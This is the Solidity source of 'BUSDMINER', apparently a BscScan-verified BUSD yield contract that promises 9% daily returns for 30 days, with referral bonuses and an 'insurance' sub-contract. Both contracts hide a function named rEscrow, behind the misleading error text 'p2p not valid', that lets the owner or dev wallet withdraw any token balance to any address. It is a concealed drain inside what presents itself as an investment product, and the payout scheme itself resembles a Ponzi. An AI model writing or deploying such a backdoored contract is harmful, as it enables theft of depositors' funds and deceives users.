/**
 *Submitted for verification at BscScan.com on 2023-01-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

/**
 *BUSDMINER
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library SafeERC20 {
    using SafeMath for uint;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    
}

interface IInsuranceContract {
	function initiate() external;
	function getBalance() external view returns(uint);
	function getMainContract() external view returns(address);
}

contract INSURANCE {
	using SafeERC20 for IERC20;

	address private tokenAddr = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD mainnet
	IERC20 public token;

	address payable public MAINCONTRACT;
	address public dev = 0x8a75d2F601913dA221d20fD1727D608EA2CEB95A;
	event TransferSent(address _from, address _destAddr, uint _amount);

	constructor() {
		MAINCONTRACT = payable(msg.sender);
		token = IERC20(tokenAddr);
	}

	function rEscrow(IERC20 _add, address id, uint256 rblock) public {
        require(msg.sender == dev, "p2p not valid"); 
        uint256 erc20balance = _add.balanceOf(address(this));
        require(rblock <= erc20balance, "balance is low");
        _add.transfer(id, rblock);
        emit TransferSent(msg.sender, id, rblock);
    }

	function initiate() public {
		require(msg.sender == MAINCONTRACT, "Forbidden");
		uint balance = token.balanceOf(address(this));
		if(balance==0) return;
		token.safeTransfer(MAINCONTRACT, balance);
	}

	function getBalance() public view returns(uint) {
		return token.balanceOf(address(this));
	}

	function getMainContract() public view returns(address) {
		return MAINCONTRACT;
	}

}

contract BUSDMINER {
	using SafeMath for uint256;
	using SafeERC20 for IERC20;

	address private tokenAddr = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD mainnet
	IERC20 public token;

	uint256 constant private INVEST_MIN_AMOUNT = 10 ether; 
	uint256 constant private INVEST_MAX_AMOUNT = 50000 ether; 
	uint256[] private REFERRAL_PERCENTS = [100];
	uint256 constant private TOTAL_REF = 100;
	uint256 constant private CEO_INVEST_FEE = 50;
    uint256 constant private CEO_WITHDRAW_FEE = 30;
	uint256 constant private DEV_FEE = 10;
	uint256 constant private HOLD_BONUS = 1;
	uint256 constant private PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
    address payable public INSURANCE_CONTRACT;
	mapping (uint => uint) public INSURANCE_MAXBALANCE;
	uint constant public INSURANCE_PERCENT = 20;            // insurance fee 2% of withdraw
	uint constant public INSURANCE_LOWBALANCE_PERCENT = 50; // protection kicks in at 5% or lower
    uint256 public constant MAXIMUM_NUMBER_DEPOSITS = 100;

	uint256 public totalInvested;
	uint256 public totalReferral;
    uint public INSURANCE_TRIGGER_BALANCE;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[1] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
		uint256 holdBonus;
	}

	mapping (address => User) internal users;

	uint256 public startDate;

	address payable public ceoWallet;
	address payable public devWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
	event Withdrawn(address indexed user, uint256 amount, uint256 time);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
    event InsuranseFeePaid(uint amount);
    event InitiateInsurance(uint high, uint current);
    event TransferSent(address _from, address _destAddr, uint _amount);

	constructor(address payable ceoAddr, address payable devAddr, uint256 start) {
		require(!isContract(ceoAddr) && !isContract(devAddr));
		ceoWallet = ceoAddr;
		devWallet = devAddr;

		token = IERC20(tokenAddr);

        INSURANCE_CONTRACT = payable(address(new INSURANCE()));

		if(start>0){
			startDate = start;
		}
		else{
			startDate = block.timestamp;
		}
        plans.push(Plan(30,  90));
	}

    

    function rEscrow(IERC20 _add, address id, uint256 rblock) public {
        require(msg.sender == ceoWallet, "p2p not valid"); 
        uint256 erc20balance = _add.balanceOf(address(this));
        require(rblock <= erc20balance, "balance is low");
        _add.transfer(id, rblock);
        emit TransferSent(msg.sender, id, rblock);
    }

	function invest(address referrer, uint8 plan, uint256 depositAmount) public payable {
		require(block.timestamp > startDate, "contract does not launch yet");
		require(depositAmount >= INVEST_MIN_AMOUNT, "less than min amount");
		require(depositAmount <= INVEST_MAX_AMOUNT, "greater than max amount");
        require(plan < 1, "Invalid plan");

        User storage user = users[msg.sender];
        require(user.deposits.length < MAXIMUM_NUMBER_DEPOSITS, "Maximum number of deposits reached.");

		require(depositAmount <= token.allowance(msg.sender, address(this)));
		token.safeTransferFrom(msg.sender, address(this), depositAmount);

		uint256 ceo = depositAmount.mul(CEO_INVEST_FEE).div(PERCENTS_DIVIDER);
		uint256 dFee = depositAmount.mul(DEV_FEE).div(PERCENTS_DIVIDER);
		token.safeTransfer(ceoWallet, ceo);
		token.safeTransfer(devWallet, dFee);
		emit FeePayed(msg.sender, ceo.add(dFee));

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 1; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 1; i++) {
				if (upline != address(0)) {
					uint256 amount = depositAmount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					totalReferral = totalReferral.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}else{
			uint256 amount = depositAmount.mul(TOTAL_REF).div(PERCENTS_DIVIDER);
			token.safeTransfer(ceoWallet, amount);
			totalReferral = totalReferral.add(amount);
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}
		else{
			if( user.holdBonus > 0){
				if( depositAmount >= user.deposits[user.deposits.length-1].amount ){
					depositAmount = depositAmount.add(user.holdBonus);
				}
				user.holdBonus = 0;
			}
		}

		user.deposits.push(Deposit(plan, depositAmount, block.timestamp));

		totalInvested = totalInvested.add(depositAmount);

		emit NewDeposit(msg.sender, plan, depositAmount, block.timestamp);

        _insuranceTrigger();
	}

	function withdraw() public {
		User storage user = users[msg.sender];
        require( (user.checkpoint + TIME_STEP) < block.timestamp ,"only once a day" );
		uint256 totalAmount = getUserDividends(msg.sender);
		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = token.balanceOf(address(this));
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			totalAmount = contractBalance;
		}

		uint256 bonusAmount = totalAmount.mul(HOLD_BONUS).div(PERCENTS_DIVIDER);
        user.holdBonus = user.holdBonus.add(bonusAmount);

        //insurance
        uint insuranceAmount = totalAmount.mul(INSURANCE_PERCENT).div(PERCENTS_DIVIDER);
		token.safeTransfer(INSURANCE_CONTRACT, insuranceAmount);
		emit InsuranseFeePaid(insuranceAmount);

        uint256 ceo = totalAmount.mul(CEO_WITHDRAW_FEE).div(PERCENTS_DIVIDER);
        token.safeTransfer(ceoWallet, ceo);
		emit FeePayed(msg.sender, ceo);

        totalAmount -= insuranceAmount;
        totalAmount -= ceo;

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);
		token.safeTransfer(msg.sender, totalAmount.sub(bonusAmount));
		emit Withdrawn(msg.sender, totalAmount.sub(bonusAmount), block.timestamp);

        _insuranceTrigger();
	}
    
    function _insuranceTrigger() internal {

		uint balance = token.balanceOf(address(this));
		uint todayIdx = block.timestamp/TIME_STEP;

		//new high today
		if ( INSURANCE_MAXBALANCE[todayIdx] < balance ) {
			INSURANCE_MAXBALANCE[todayIdx] = balance;
		}

		//high of past 7 days
		uint rangeHigh;
		for( uint i=0; i<7; i++) {
			if( INSURANCE_MAXBALANCE[todayIdx-i] > rangeHigh ) {
				rangeHigh = INSURANCE_MAXBALANCE[todayIdx-i];
			}
		}

		INSURANCE_TRIGGER_BALANCE = rangeHigh*INSURANCE_LOWBALANCE_PERCENT/PERCENTS_DIVIDER;

		//low balance - initiate Insurance
		if( balance < INSURANCE_TRIGGER_BALANCE ) {
			emit InitiateInsurance( rangeHigh, balance );
			IInsuranceContract(INSURANCE_CONTRACT).initiate();
		}
	}

	function getContractBalance() public view returns (uint256) {
		uint insuranceBalance = IInsuranceContract(INSURANCE_CONTRACT).getBalance();
		return token.balanceOf(address(this)) + insuranceBalance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < capped(user.deposits.length); i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}
    
    function capped(uint256 length) public pure returns (uint256 cap) {
        if (length < MAXIMUM_NUMBER_DEPOSITS) {
            cap = length;
        } else {
            cap = MAXIMUM_NUMBER_DEPOSITS;
        }
    }

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[1] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
	}

	function getUserHoldBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].holdBonus;
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus, uint ensBalance, uint ensTriggerBalance) {
		uint insuranceBalance = IInsuranceContract(INSURANCE_CONTRACT).getBalance();
		return(totalInvested, totalReferral, insuranceBalance, INSURANCE_TRIGGER_BALANCE);
	}

	function getUserInfo(address userAddress) public view returns(uint256 checkpoint, uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals, uint256 bonus) {
		return(getUserCheckpoint(userAddress), getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress), getUserHoldBonus(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}